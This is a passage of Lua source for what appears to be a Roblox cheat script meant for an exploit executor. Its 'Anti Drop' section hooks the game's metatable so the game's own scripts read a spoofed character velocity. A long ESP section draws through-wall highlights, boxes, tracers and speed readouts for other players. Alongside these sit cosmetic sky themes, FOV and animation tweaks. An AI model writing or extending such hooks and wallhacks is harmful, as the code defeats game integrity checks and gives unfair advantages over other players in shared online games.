SPD.setLaggerNormal = setLaggerNormal
SPD.setLaggerCarry = setLaggerCarry
SPD.resetMovementState = resetMovementState
SPD.refreshSpeedModeLabel = refreshSpeedModeLabel
SPD.cleanupSpeedPhysics = cleanupSpeedPhysics
SPD.setupMovementAndIndicators = setupMovementAndIndicators
SPD.getActiveMoveSpeed = getActiveMoveSpeed

CarrySystem._state = State
CarrySystem:start()
startEnemySpeed()

-- ============================================================
-- ANTI DROP (404 velocity spoof; existing Embeer interface)
-- ============================================================
SPD.antiDropEnabled = SPD.antiDropEnabled == true
do
    local mt = getrawmetatable(game)
    local oldIdx, oldNewIdx
    local spoofedVelocity = Vector3.zero
    local antiDropActive = false

    local function startAntiDrop()
        if antiDropActive then return end
        if not mt then return end
        oldIdx = mt.__index
        oldNewIdx = mt.__newindex
        setreadonly(mt, false)
        mt.__index = newcclosure(function(self, key)
            if not checkcaller() and (key == "AssemblyLinearVelocity" or key == "Velocity") and
               typeof(self) == "Instance" and self:IsA("BasePart") and self.Name == "HumanoidRootPart" and
               self:IsDescendantOf(LP.Character) then
                return spoofedVelocity
            end
            return oldIdx(self, key)
        end)
        mt.__newindex = newcclosure(function(self, key, value)
            if not checkcaller() and (key == "AssemblyLinearVelocity" or key == "Velocity") and
               typeof(self) == "Instance" and self:IsA("BasePart") and self.Name == "HumanoidRootPart" and
               self:IsDescendantOf(LP.Character) then
                spoofedVelocity = value
                return
            end
            return oldNewIdx(self, key, value)
        end)
        setreadonly(mt, true)
        antiDropActive = true

    end

    local function stopAntiDrop()
        if not antiDropActive then return end
        if mt and oldIdx then
            setreadonly(mt, false)
            mt.__index = oldIdx
            mt.__newindex = oldNewIdx
            setreadonly(mt, true)
            oldIdx = nil
            oldNewIdx = nil
        end
        antiDropActive = false
    end


    function SPD.setAntiDrop(on)
        if on then startAntiDrop() else stopAntiDrop() end
        SPD.antiDropEnabled = antiDropActive == true
        task.spawn(saveConfig)
    end

    function SPD.isAntiDropOn()
        return antiDropActive == true
    end

    SPD._antiDropBoot = function()
        if SPD.antiDropEnabled then startAntiDrop() else stopAntiDrop() end
    end
end

end -- speed/anti-drop scope

local themeNames = {"Off", "Night", "Aurora", "Sunset", "Galaxy", "Cyber", "Sakura", "Pink Night", "Blood Moon", "Emerald Dawn", "Volcanic", "Arctic", "Midnight Ocean", "Vaporwave", "Toxic", "Solar Eclipse", "Hellscape", "Heaven", "Storm", "Sunrise", "Deep Space", "Lavender Dream", "Inferno", "Mint Sky"}

local SKY_PRESETS_LIST = {"Off", "Night", "Aurora", "Sunset", "Galaxy", "Cyber", "Sakura", "Pink Night", "Blood Moon", "Emerald Dawn", "Volcanic", "Arctic", "Midnight Ocean", "Vaporwave", "Toxic", "Solar Eclipse", "Hellscape", "Heaven", "Storm", "Sunrise", "Deep Space", "Lavender Dream", "Inferno", "Mint Sky"}

local SKY_PRESETS = {
    ["Off"] = {kind = "off"},
    ["Night"] = {clock=22,brightness=2,ambient={110,100,130},outAmb={120,110,140},sky={stars=4000,moon=18,sun=0,moonTex=true},atm={dens=0.45,color={120,60,180},decay={60,20,100},glare=0.5,haze=1.2}},
    ["Aurora"] = {clock=14,brightness=3,ambient={150,120,150},outAmb={160,130,150},atm={dens=0.55,color={255,80,200},decay={255,20,150},glare=2.5,haze=3},clouds={cover=0.7,dens=0.7,color={255,240,250}}},
    ["Sunset"] = {clock=17.2,brightness=2.5,ambient={170,120,100},outAmb={180,130,110},sky={stars=0,sun=25,moon=0},atm={dens=0.5,color={255,130,60},decay={255,80,30},glare=2,haze=2.5},clouds={cover=0.55,dens=0.55,color={255,200,140}}},
    ["Galaxy"] = {clock=0,brightness=1.5,ambient={70,60,100},outAmb={80,70,110},sky={stars=10000,moon=30,sun=0},atm={dens=0.15,color={40,20,80},decay={20,10,50},glare=0.3,haze=0.5}},
    ["Cyber"] = {clock=21,brightness=2.2,ambient={90,130,170},outAmb={100,140,180},sky={stars=2000,moon=12},atm={dens=0.4,color={0,200,255},decay={150,0,255},glare=2,haze=2},clouds={cover=0.4,dens=0.6,color={100,200,255}}},
    ["Sakura"] = {clock=11,brightness=3.5,ambient={170,150,160},outAmb={180,160,170},sky={sun=8},atm={dens=0.3,color={255,200,220},decay={255,170,200},glare=1,haze=1.5},clouds={cover=0.6,dens=0.4,color={255,250,252}}},
    ["Pink Night"] = {clock=23,brightness=2.2,ambient={120,60,110},outAmb={140,70,120},sky={stars=5000,moon=22,sun=0,moonTex=true},atm={dens=0.5,color={255,80,180},decay={140,30,100},glare=0.7,haze=1.4},clouds={cover=0.3,dens=0.5,color={180,90,150}}},
    ["Blood Moon"] = {clock=22.5,brightness=1.6,ambient={130,40,40},outAmb={150,50,50},sky={stars=1500,moon=28,sun=0,moonTex=true},atm={dens=0.6,color={220,30,30},decay={120,10,10},glare=1.4,haze=2},clouds={cover=0.5,dens=0.7,color={120,30,30}}},
    ["Emerald Dawn"] = {clock=6.5,brightness=2.8,ambient={130,170,140},outAmb={140,180,150},sky={sun=18,moon=0,stars=0},atm={dens=0.4,color={80,200,140},decay={40,150,90},glare=1.8,haze=2.2},clouds={cover=0.5,dens=0.5,color={200,255,220}}},
    ["Volcanic"] = {clock=19,brightness=2,ambient={180,80,40},outAmb={200,90,50},sky={stars=200,sun=12,moon=0},atm={dens=0.75,color={255,60,0},decay={180,20,0},glare=3,haze=3.5},clouds={cover=0.8,dens=0.9,color={120,40,20}}},
    ["Arctic"] = {clock=9,brightness=3.2,ambient={200,220,235},outAmb={210,230,245},sky={sun=10,stars=0,moon=0},atm={dens=0.3,color={180,220,255},decay={140,200,240},glare=1.5,haze=1.8},clouds={cover=0.7,dens=0.6,color={250,253,255}}},
    ["Midnight Ocean"] = {clock=1.5,brightness=1.7,ambient={60,90,130},outAmb={70,100,140},sky={stars=6000,moon=24,sun=0,moonTex=true},atm={dens=0.5,color={20,60,140},decay={10,30,90},glare=0.6,haze=1.5}},
    ["Vaporwave"] = {clock=19.5,brightness=2.4,ambient={180,120,200},outAmb={190,130,210},sky={stars=1000,moon=14},atm={dens=0.45,color={255,100,220},decay={120,60,255},glare=2.2,haze=2.4},clouds={cover=0.5,dens=0.55,color={200,150,255}}},
    ["Toxic"] = {clock=13,brightness=2.5,ambient={140,180,80},outAmb={150,190,90},atm={dens=0.55,color={100,220,40},decay={60,150,20},glare=1.8,haze=2.6},clouds={cover=0.65,dens=0.7,color={180,255,120}}},
    ["Solar Eclipse"] = {clock=12,brightness=0.9,ambient={50,40,60},outAmb={60,50,70},sky={stars=3500,sun=22,moon=0},atm={dens=0.5,color={255,140,40},decay={30,20,40},glare=2.8,haze=1.8}},
    ["Hellscape"] = {clock=18,brightness=1.8,ambient={200,60,30},outAmb={220,70,40},sky={stars=100,sun=30,moon=0},atm={dens=0.85,color={255,30,0},decay={120,0,0},glare=3.5,haze=4},clouds={cover=0.95,dens=0.95,color={80,20,10}}},
    ["Heaven"] = {clock=12,brightness=4,ambient={240,235,210},outAmb={250,245,220},sky={sun=16,moon=0,stars=0},atm={dens=0.25,color={255,250,220},decay={255,240,200},glare=3,haze=1.5},clouds={cover=0.85,dens=0.5,color={255,255,255}}},
    ["Storm"] = {clock=15,brightness=1.4,ambient={90,90,110},outAmb={100,100,120},sky={stars=0,sun=6,moon=0},atm={dens=0.65,color={80,90,120},decay={40,50,80},glare=0.5,haze=3},clouds={cover=0.95,dens=0.95,color={60,65,80}}},
    ["Sunrise"] = {clock=6.2,brightness=2.8,ambient={220,180,130},outAmb={230,190,140},sky={sun=22,stars=0,moon=0},atm={dens=0.45,color={255,180,100},decay={255,140,80},glare=2.4,haze=2.2},clouds={cover=0.4,dens=0.4,color={255,220,180}}},
    ["Deep Space"] = {clock=0,brightness=1,ambient={30,25,50},outAmb={40,35,60},sky={stars=15000,moon=0,sun=0},atm={dens=0.08,color={15,5,40},decay={5,0,20},glare=0.2,haze=0.3}},
    ["Lavender Dream"] = {clock=18.5,brightness=2.6,ambient={180,160,220},outAmb={190,170,230},sky={stars=800,moon=16,sun=0},atm={dens=0.4,color={200,160,255},decay={160,120,220},glare=1.4,haze=1.8},clouds={cover=0.55,dens=0.5,color={220,200,255}}},
    ["Inferno"] = {clock=17.5,brightness=2.2,ambient={220,100,40},outAmb={235,110,50},sky={sun=26,moon=0,stars=0},atm={dens=0.6,color={255,90,20},decay={200,40,0},glare=3,haze=3.2},clouds={cover=0.7,dens=0.7,color={200,80,40}}},
    ["Mint Sky"] = {clock=10,brightness=3.2,ambient={180,230,210},outAmb={190,240,220},sky={sun=10},atm={dens=0.32,color={150,255,210},decay={100,220,180},glare=1.6,haze=1.6},clouds={cover=0.55,dens=0.45,color={240,255,250}}},
}

local function _vC3(t) return Color3.fromRGB(t[1], t[2], t[3]) end

local function _v4mpClearSky()
    for _, v in ipairs(Lighting:GetChildren()) do
        if v:GetAttribute("_V4MPSky") then pcall(function() v:Destroy() end) end
    end
    local terrain = workspace:FindFirstChildOfClass("Terrain")
    if terrain then
        for _, v in ipairs(terrain:GetChildren()) do
            if v:GetAttribute("_V4MPSky") then pcall(function() v:Destroy() end) end
        end
    end
end

local function applyCustomSky(mode)
    _v4mpClearSky()
    local preset = SKY_PRESETS[mode]
    if not preset or preset.kind == "off" then
        Lighting.FogEnd = 100000; Lighting.FogStart = 0
        Lighting.FogColor = Color3.fromRGB(192,192,192)
        Lighting.Brightness = 2; Lighting.ClockTime = 14; Lighting.GlobalShadows = true
        State.gameTheme = "Off"
        return
    end
    Lighting.FogEnd = 100000; Lighting.FogStart = 0
    Lighting.FogColor = Color3.fromRGB(200,200,200)
    Lighting.GlobalShadows = true
    Lighting.ClockTime = preset.clock or 14
    Lighting.Brightness = preset.brightness or 2
    if preset.outAmb then Lighting.OutdoorAmbient = _vC3(preset.outAmb) end
    if preset.ambient then Lighting.Ambient = _vC3(preset.ambient) end
    if preset.sky then
        local sky = Instance.new("Sky")
        sky:SetAttribute("_V4MPSky", true)
        if preset.sky.stars then sky.StarCount = preset.sky.stars end
        if preset.sky.moon then sky.MoonAngularSize = preset.sky.moon end
        if preset.sky.sun then sky.SunAngularSize = preset.sky.sun end
        if preset.sky.moonTex then sky.MoonTextureId = "rbxasset://sky/moon.jpg" end
        sky.Parent = Lighting
    end
    if preset.atm then
        local atm = Instance.new("Atmosphere")
        atm:SetAttribute("_V4MPSky", true)
        atm.Density = preset.atm.dens or 0.3
        atm.Color = _vC3(preset.atm.color)
        atm.Decay = _vC3(preset.atm.decay)
        atm.Glare = preset.atm.glare or 1
        atm.Haze = preset.atm.haze or 1
        atm.Parent = Lighting
    end
    local terrain = workspace:FindFirstChildOfClass("Terrain")
    if preset.clouds and terrain then
        local clouds = Instance.new("Clouds")
        clouds:SetAttribute("_V4MPSky", true)
        clouds.Cover = preset.clouds.cover or 0.5
        clouds.Density = preset.clouds.dens or 0.5
        clouds.Color = _vC3(preset.clouds.color)
        clouds.Parent = terrain
    end
    State.gameTheme = mode
end

local getKeyName
local function cancelActiveKeybind()
    if activeKeybindListener then
        activeKeybindListener:Disconnect()
        activeKeybindListener = nil
    end
    if activeKeybindBtn and activeKeybindKeyRef then
        activeKeybindBtn.Text = getKeyName(Keys[activeKeybindKeyRef])
        activeKeybindBtn = nil
        activeKeybindKeyRef = nil
    end
end

do
local registry = _G.EmbeerKeybinds
function registry.refreshKeys()
    for key, buttons in pairs(registry.buttons) do
        for _, button in ipairs(buttons) do
            if button.Parent and button ~= activeKeybindBtn then
                button.Text = getKeyName(Keys[key] or Enum.KeyCode.Unknown)
            end
        end
    end
    for key, button in pairs(keybindBtnRefs) do
        if button.Parent and button ~= activeKeybindBtn then button.Text = getKeyName(Keys[key]) end
    end
end
function registry.capture(btn, keyRef)
    activeKeybindListener = trackConn(UIS.InputBegan:Connect(function(inp)
        if inp.UserInputType ~= Enum.UserInputType.Keyboard and inp.UserInputType ~= Enum.UserInputType.Gamepad1 then return end
        if UIS:GetFocusedTextBox() then return end
        local key = inp.KeyCode
        registry.suppressedUntil = tick() + 0.15
        if key == Enum.KeyCode.Escape or key == Enum.KeyCode.ButtonB then cancelActiveKeybind(); return end
        if key == Enum.KeyCode.Unknown then return end
        if key == Enum.KeyCode.Backspace or key == Enum.KeyCode.Delete then key = Enum.KeyCode.Unknown end
        if key ~= Enum.KeyCode.Unknown then
            -- A key executes only one action. Clear previous assignments explicitly.
            for other, value in pairs(Keys) do
                if other ~= keyRef and value == key then Keys[other] = Enum.KeyCode.Unknown end
            end
        end
        Keys[keyRef] = key
        cancelActiveKeybind()
        registry.refreshKeys()
        task.spawn(saveConfig)
    end))
end
end

local stretchRezConn = nil
local STRETCH_NAME = "Noxy_Stretch"
local function enableStretchRez()
    State.stretchRezEnabled = true
    pcall(function() RunService:UnbindFromRenderStep(STRETCH_NAME) end)
    pcall(function()
        RunService:BindToRenderStep(STRETCH_NAME, Enum.RenderPriority.Last.Value - 1, function()
            local cam = workspace.CurrentCamera
            if cam then
                cam.CFrame = cam.CFrame * CFrame.new(0, 0, 0, 1, 0, 0, 0, 0.8, 0, 0, 0, 1)
            end
        end)
    end)
end
local function disableStretchRez()
    State.stretchRezEnabled = false
    pcall(function() RunService:UnbindFromRenderStep(STRETCH_NAME) end)
end

function _G.BlastEnableCustomFov()
    State.fovEnabled = true
    State.fovValue = math.clamp(tonumber(State.fovValue) or 70, 30, 120)
    if _G.BlastCustomFovConnection then
        pcall(function() _G.BlastCustomFovConnection:Disconnect() end)
        _G.BlastCustomFovConnection = nil
    end
    local camera = workspace.CurrentCamera
    if camera then camera.FieldOfView = State.fovValue end
    _G.BlastCustomFovConnection = trackConn(RunService.RenderStepped:Connect(function()
        if not State.fovEnabled then return end
        local currentCamera = workspace.CurrentCamera
        if currentCamera then currentCamera.FieldOfView = State.fovValue end
    end))
end

function _G.BlastDisableCustomFov()
    State.fovEnabled = false
    if _G.BlastCustomFovConnection then
        pcall(function() _G.BlastCustomFovConnection:Disconnect() end)
        _G.BlastCustomFovConnection = nil
    end
    local camera = workspace.CurrentCamera
    if camera then camera.FieldOfView = 70 end
end

-- ============================================================
-- ZOMBIE ANIMATIONS (REMBEMBI) - ported from Spectrum
-- ============================================================
local RembembiAnims = {
    WalkAnim  = 73718308412641,
    RunAnim   = 135515454877967,
    JumpAnim  = 78508480717326,
    FallAnim  = 78147885297412,
    SwimIdle  = 129183123083281,
    Swim      = 110657013921774,
    ClimbAnim = 129447497744818,
    Animation1= 92849173543269,
    Animation2= 132238900951109,
}
local ZombieAnimRefs = { heartbeat=nil, originalAnims=nil }
local function _zombieIsRembembi(id)
    if not id then return false end
    for _, v in pairs(RembembiAnims) do if v == id then return true end end
    return false
end
local function _zombieSaveOriginal(char)
    local animate = char:FindFirstChild("Animate")
    if not animate then return end
    local function g(obj) return obj and obj.AnimationId or nil end
    local ids = {
        walk=g(animate.walk and animate.walk.WalkAnim),
        run=g(animate.run and animate.run.RunAnim),
        jump=g(animate.jump and animate.jump.JumpAnim),
        fall=g(animate.fall and animate.fall.FallAnim),
        climb=g(animate.climb and animate.climb.ClimbAnim),
        swim=g(animate.swim and animate.swim.Swim),
        swimidle=g(animate.swimidle and animate.swimidle.SwimIdle),
        idle1=g(animate.idle and animate.idle.Animation1),
        idle2=g(animate.idle and animate.idle.Animation2),
    }
    if not _zombieIsRembembi(ids.walk) then ZombieAnimRefs.originalAnims = ids end
end
local function _zombieApply(char)
    local animate = char:FindFirstChild("Animate")
    if not animate then return end
    local function s(obj, id) if obj then obj.AnimationId = "rbxassetid://" .. id end end
    s(animate.walk and animate.walk.WalkAnim, RembembiAnims.WalkAnim)
    s(animate.run and animate.run.RunAnim, RembembiAnims.RunAnim)
    s(animate.jump and animate.jump.JumpAnim, RembembiAnims.JumpAnim)
    s(animate.fall and animate.fall.FallAnim, RembembiAnims.FallAnim)
    s(animate.climb and animate.climb.ClimbAnim, RembembiAnims.ClimbAnim)
    s(animate.swim and animate.swim.Swim, RembembiAnims.Swim)
    s(animate.swimidle and animate.swimidle.SwimIdle, RembembiAnims.SwimIdle)
    s(animate.idle and animate.idle.Animation1, RembembiAnims.Animation1)
    s(animate.idle and animate.idle.Animation2, RembembiAnims.Animation2)
end
local function _zombieRestore(char)
    local orig = ZombieAnimRefs.originalAnims
    if not orig then return end
    local animate = char:FindFirstChild("Animate")
    if not animate then return end
    local function s(obj, id) if obj and id then obj.AnimationId = id end end
    s(animate.walk and animate.walk.WalkAnim, orig.walk)
    s(animate.run and animate.run.RunAnim, orig.run)
    s(animate.jump and animate.jump.JumpAnim, orig.jump)
    s(animate.fall and animate.fall.FallAnim, orig.fall)
    s(animate.climb and animate.climb.ClimbAnim, orig.climb)
    s(animate.swim and animate.swim.Swim, orig.swim)
    s(animate.swimidle and animate.swimidle.SwimIdle, orig.swimidle)
    s(animate.idle and animate.idle.Animation1, orig.idle1)
    s(animate.idle and animate.idle.Animation2, orig.idle2)
end
local function startZombieAnims()
    if ZombieAnimRefs.heartbeat then ZombieAnimRefs.heartbeat:Disconnect(); ZombieAnimRefs.heartbeat = nil end
    local char = LP.Character
    if char then _zombieSaveOriginal(char); _zombieApply(char) end
    ZombieAnimRefs.heartbeat = trackConn(RunService.Heartbeat:Connect(function()
        if not State.zombieAnimsEnabled then return end
        local c = LP.Character
        if c then _zombieApply(c) end
    end))
end
local function stopZombieAnims()
    if ZombieAnimRefs.heartbeat then ZombieAnimRefs.heartbeat:Disconnect(); ZombieAnimRefs.heartbeat = nil end
    local char = LP.Character
    if char then _zombieRestore(char) end
end

-- ============================================================
-- ESP COMPLETE (VX7): box 2D + line + highlight + info panel (enemy speed)
-- ============================================================
ESP.Objects = {}
ESP._sg = nil
ESP._lineGui = nil
ESP._playerData = {}
ESP._lineData = {}
ESP._infoCache = {}
ESP.Connection = nil
ESP._boxAdd = nil
ESP._boxRem = nil
ESP._infoAdd = nil
ESP._infoRem = nil

ESP.accentColor = function()
	return (State.colorApi and State.colorApi.accent) or Color3.fromRGB(235, 35, 45)
end

ESP.clearInfo = function(p)
	local data = ESP._infoCache[p]
	if not data then return end
	if data.conn then pcall(function() data.conn:Disconnect() end) end
	if data.charConn then pcall(function() data.charConn:Disconnect() end) end
	if data.gui and data.gui.Parent then pcall(function() data.gui:Destroy() end) end
	ESP._infoCache[p] = nil
end

-- One render pass owns the box, tracer, speed and name. The label deliberately
-- lives above the box (rather than over the player's face or the speed value).
ESP.createInfo = function(p)
    if p == LP or ESP._infoCache[p] then return end
    local pg = LP:FindFirstChild("PlayerGui") or LP:WaitForChild("PlayerGui")
    local screen = Instance.new("ScreenGui")
    screen.Name = "VX7_EI_" .. tostring(p.UserId)
    screen.ResetOnSpawn = false
    screen.IgnoreGuiInset = true
    screen.DisplayOrder = 999
    screen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    screen.Parent = pg

    local root = Instance.new("Frame", screen)
    root.Name = "ESPInfo_" .. tostring(p.UserId)
    root.Size = UDim2.fromOffset(360, 46)
    root.AnchorPoint = Vector2.new(0.5, 1)
    root.BackgroundTransparency = 1
    root.BorderSizePixel = 0
    root.Visible = false
    root.ZIndex = 4

    local nameLbl = Instance.new("TextLabel", root)
    nameLbl.Name = "EnemyName"
    nameLbl.Size = UDim2.new(1, -8, 0, 16)
    nameLbl.Position = UDim2.fromOffset(4, 0)
    nameLbl.BackgroundTransparency = 1
    nameLbl.Text = ESP._nickname(p)
    nameLbl.TextColor3 = Color3.fromRGB(255, 230, 245)
    nameLbl.Font = Enum.Font.GothamBold
    nameLbl.TextSize = 12
    nameLbl.TextXAlignment = Enum.TextXAlignment.Center
    nameLbl.TextTruncate = Enum.TextTruncate.None
    nameLbl.TextStrokeTransparency = 0.35
    nameLbl.TextStrokeColor3 = Color3.new(0, 0, 0)
    nameLbl.ZIndex = 5

    local speedLbl = Instance.new("TextLabel", root)
    speedLbl.Name = "EnemySpeedValue"
    speedLbl.Size = UDim2.new(1, 0, 0, 30)
    speedLbl.Position = UDim2.fromOffset(0, 16)
    speedLbl.BackgroundTransparency = 1
    speedLbl.Text = "0.0"
    speedLbl.TextColor3 = ESP.accentColor()
    speedLbl.Font = Enum.Font.GothamBlack
    speedLbl.TextSize = 24
    speedLbl.TextXAlignment = Enum.TextXAlignment.Center
    speedLbl.TextYAlignment = Enum.TextYAlignment.Center
    speedLbl.TextStrokeTransparency = 0.35
    speedLbl.TextStrokeColor3 = Color3.new(0, 0, 0)
    speedLbl.ZIndex = 5

    ESP._infoCache[p] = {gui = screen, root = root, speedLbl = speedLbl, nameLbl = nameLbl}
end

-- Resolve current parts each render; respawns/streaming never retain stale anchors.
ESP._nickname = function(p)
    if p.DisplayName and p.DisplayName ~= p.Name then
        return p.DisplayName .. " (@" .. p.Name .. ")"
    end
    return p.Name
end

ESP._bodyAnchor = function(char)
    for _, name in ipairs({"LowerTorso", "Torso", "HumanoidRootPart", "UpperTorso", "Head"}) do
        local part = char:FindFirstChild(name)
        if part and part:IsA("BasePart") then return part end
    end
end

ESP._waistPosition = function(char)
    local anchor = char and ESP._bodyAnchor(char)
    if not anchor then return nil end
    local waist = anchor:FindFirstChild("WaistRigAttachment")
    if waist and waist:IsA("Attachment") then return waist.WorldPosition end
    if anchor.Name == "Torso" then
        return anchor.Position - anchor.CFrame.UpVector * (anchor.Size.Y * 0.25)
    end
    return anchor.Position
end

ESP._finite = function(value)
    return value == value and math.abs(value) < math.huge
end

local ESP_BODY_PARTS = {
    Head=true, Torso=true, UpperTorso=true, LowerTorso=true,
    ["Left Arm"]=true, ["Right Arm"]=true, ["Left Leg"]=true, ["Right Leg"]=true,
    LeftUpperArm=true, LeftLowerArm=true, LeftHand=true,
    RightUpperArm=true, RightLowerArm=true, RightHand=true,
    LeftUpperLeg=true, LeftLowerLeg=true, LeftFoot=true,
    RightUpperLeg=true, RightLowerLeg=true, RightFoot=true,
}

-- Clip tracer endpoints to the viewport without changing the visible direction.
ESP._clipLine = function(origin, target, vp)
    local dx, dy = target.X - origin.X, target.Y - origin.Y
    local first, last = 0, 1
    local function edge(p, q)
        if p == 0 then return q >= 0 end
        local t = q / p
        if p < 0 then first = math.max(first, t) else last = math.min(last, t) end
        return first <= last
    end
    if not edge(-dx, origin.X) or not edge(dx, vp.X - origin.X)
        or not edge(-dy, origin.Y) or not edge(dy, vp.Y - origin.Y) then return nil end
    return Vector2.new(origin.X + dx * first, origin.Y + dy * first),
        Vector2.new(origin.X + dx * last, origin.Y + dy * last)
end

-- Project every body-part corner and near-plane edge intersection. Dropping a
-- whole limb when only one corner crosses the camera caused zoom flicker.
-- Accessories/tools are excluded; fully transparent streamed body parts remain
-- eligible, so camera transparency does not intermittently erase the outline.
ESP._bodyBounds = function(char, cam, vp, anchor)
    if not anchor then return nil end
    local near = math.max(0.01, math.abs(cam.NearPlaneZ))
    local minX, minY, maxX, maxY = math.huge, math.huge, -math.huge, -math.huge
    local function include(world)
        local point = cam:WorldToViewportPoint(world)
        if ESP._finite(point.X) and ESP._finite(point.Y) and point.Z >= near * 0.999 then
            minX, minY = math.min(minX, point.X), math.min(minY, point.Y)
            maxX, maxY = math.max(maxX, point.X), math.max(maxY, point.Y)
        end
    end
    for _, part in ipairs(char:GetChildren()) do
        if part:IsA("BasePart") and ESP_BODY_PARTS[part.Name] then
            local half = part.Size * 0.5
            local corners, depths = {}, {}
            for ix = 0, 1 do
                for iy = 0, 1 do
                    for iz = 0, 1 do
                        local index = ix * 4 + iy * 2 + iz + 1
                        local world = part.CFrame:PointToWorldSpace(Vector3.new(
                            half.X * (ix * 2 - 1), half.Y * (iy * 2 - 1), half.Z * (iz * 2 - 1)))
                        corners[index] = world
                        depths[index] = cam:WorldToViewportPoint(world).Z
                        if depths[index] >= near then include(world) end
                    end
                end
            end
            for index = 1, 8 do
                for _, step in ipairs({1, 2, 4}) do
                    if math.floor((index - 1) / step) % 2 == 0 then
                        local other = index + step
                        local z1, z2 = depths[index], depths[other]
                        if (z1 < near and z2 >= near) or (z2 < near and z1 >= near) then
                            include(corners[index]:Lerp(corners[other], (near - z1) / (z2 - z1)))
                        end
                    end
                end
            end
        end
    end
    if maxX <= minX or maxY <= minY then return nil end
    if maxX < 0 or minX > vp.X or maxY < 0 or minY > vp.Y then return nil end
    -- Pixel padding preserves distant subpixel silhouettes without imposing a
    -- fake fixed aspect ratio. Do not round coordinates or smooth behind camera.
    return minX - 2, minY - 2, maxX + 2, maxY + 2
end

ESP.removeForPlayer = function(p)
	local data = ESP.Objects[p]
	if data then
		pcall(function() if data.highlight and data.highlight.Parent then data.highlight:Destroy() end end)
		pcall(function() if data.boxFrame and data.boxFrame.Parent then data.boxFrame:Destroy() end end)
		ESP.Objects[p] = nil
	end
	local pd = ESP._playerData[p]
	if pd then
		if pd.charAddConn then pcall(function() pd.charAddConn:Disconnect() end) end
		if pd.charRemConn then pcall(function() pd.charRemConn:Disconnect() end) end
		ESP._playerData[p] = nil
	end
	local ld = ESP._lineData[p]
	if ld then
		if ld.conn then pcall(function() ld.conn:Disconnect() end) end
		if ld.renderer and ld.renderer.Parent then pcall(function() ld.renderer:Destroy() end) end
		ESP._lineData[p] = nil
	end
	ESP.clearInfo(p)
end

ESP._watchPlayer = function(p)
	if p == LP then return end
	ESP._playerData[p] = ESP._playerData[p] or {}
	local pd = ESP._playerData[p]
	if not pd.charRemConn then
		pd.charRemConn = p.CharacterRemoving:Connect(function()
			local data = ESP.Objects[p]
			if data and data.boxFrame then data.boxFrame.Visible = false end
			local ld = ESP._lineData[p]
			if ld and ld.renderer then ld.renderer.Visible = false end
			local info = ESP._infoCache[p]
			if info and info.root then info.root.Visible = false end
			if data and data.highlight then
				pcall(function() data.highlight:Destroy() end)
				data.highlight = nil
			end
		end)
	end
	if not pd.charAddConn then
		pd.charAddConn = p.CharacterAdded:Connect(function()
			task.defer(function()
				local newChar = p.Character
				if newChar then newChar:WaitForChild("HumanoidRootPart", 5) end
				if State.espEnabled and p.Parent == Players then
					pcall(function() ESP.createForPlayer(p) end)
					pcall(function() ESP.createInfo(p) end)
				end
			end)
		end)
	end
end

ESP.createForPlayer = function(p)
	if p == LP or not State.espEnabled or p.Parent ~= Players then return end
	-- clear visuals but keep watchers
	local data = ESP.Objects[p]
	if data then
		pcall(function() if data.highlight and data.highlight.Parent then data.highlight:Destroy() end end)
		pcall(function() if data.boxFrame and data.boxFrame.Parent then data.boxFrame:Destroy() end end)
		ESP.Objects[p] = nil
	end
	local ld = ESP._lineData[p]
	if ld then
		if ld.conn then pcall(function() ld.conn:Disconnect() end) end
		if ld.renderer and ld.renderer.Parent then pcall(function() ld.renderer:Destroy() end) end
		ESP._lineData[p] = nil
	end

	ESP._watchPlayer(p)
	local char = p.Character
	if not char then return end
	local anchor = ESP._bodyAnchor(char)
	if not anchor then return end
	local accent = ESP.accentColor()

	-- Highlight (chams) — VX7 style
	local hl = Instance.new("Highlight")
	hl.Name = "VX7_ESPPlayer"
	hl.Adornee = char
	hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
	hl.FillTransparency = 0.7
	hl.OutlineTransparency = 0.3
	hl.FillColor = accent
	hl.OutlineColor = accent
	pcall(function() hl:SetAttribute("VX7ESP", true) end)
	hl.Parent = char

	-- 2D box ScreenGui
	if not ESP._sg or not ESP._sg.Parent then
		local sg = Instance.new("ScreenGui")
		sg.Name = "VX7_ESPBox2D"
		sg.ResetOnSpawn = false
		sg.DisplayOrder = 998
		sg.IgnoreGuiInset = true
		sg.Parent = LP:FindFirstChild("PlayerGui") or LP:WaitForChild("PlayerGui")
		ESP._sg = sg
		ESP.gui = sg
	end

	local boxFrame = Instance.new("Frame", ESP._sg)
	boxFrame.Name = "ESPBox_" .. tostring(p.UserId)
	boxFrame.BackgroundColor3 = accent
	boxFrame.BackgroundTransparency = 1
	boxFrame.BorderSizePixel = 0
	boxFrame.Visible = false
	boxFrame.ZIndex = 2
	local uiStroke = Instance.new("UIStroke", boxFrame)
	uiStroke.Color = accent
	uiStroke.Thickness = 1.5
	uiStroke.Transparency = 0
	uiStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

	ESP.Objects[p] = {
		highlight = hl,
		boxFrame = boxFrame,
		boxStroke = uiStroke,
		char = char,
	}

	-- Tracer line (withLine mode)
	if State.espMode == "withLine" then
		if not ESP._lineGui or not ESP._lineGui.Parent then
			local lg = Instance.new("ScreenGui")
			lg.Name = "VX7_ESPLine"
			lg.ResetOnSpawn = false
			lg.IgnoreGuiInset = true
			lg.DisplayOrder = 998
			lg.ZIndexBehavior = Enum.ZIndexBehavior.Global
			lg.Parent = LP:FindFirstChild("PlayerGui") or LP:WaitForChild("PlayerGui")
			ESP._lineGui = lg
		end
		local line = Instance.new("Frame")
		line.Name = "Line_" .. tostring(p.UserId)
		line.AnchorPoint = Vector2.new(0.5, 0.5)
		line.BackgroundColor3 = accent
		line.BackgroundTransparency = 0
		line.BorderSizePixel = 0
		line.Visible = false
		line.ZIndex = 1
		line.Parent = ESP._lineGui
		ESP._lineData[p] = { renderer = line }
	end
end

ESP._updateBoxes = function()
    if not State.espEnabled then return end
    local cam = workspace.CurrentCamera
    local vp = cam and cam.ViewportSize
    if not cam or not vp or vp.X <= 0 or vp.Y <= 0 then
        for _, data in pairs(ESP.Objects) do
            if data.boxFrame then data.boxFrame.Visible = false end
            if data.highlight then data.highlight.Enabled = false end
        end
        for _, ld in pairs(ESP._lineData) do ld.renderer.Visible = false end
        for _, info in pairs(ESP._infoCache) do info.root.Visible = false end
        return
    end
    local accent = ESP.accentColor()
    -- Blast's character-to-character tracer, now using the waist for both ends.
    -- First-person/absent local character falls back to Blast's viewport origin.
    local origin = Vector2.new(vp.X * 0.5, vp.Y)
    local myWaist = ESP._waistPosition(LP.Character)
    if myWaist then
        local me = cam:WorldToViewportPoint(myWaist)
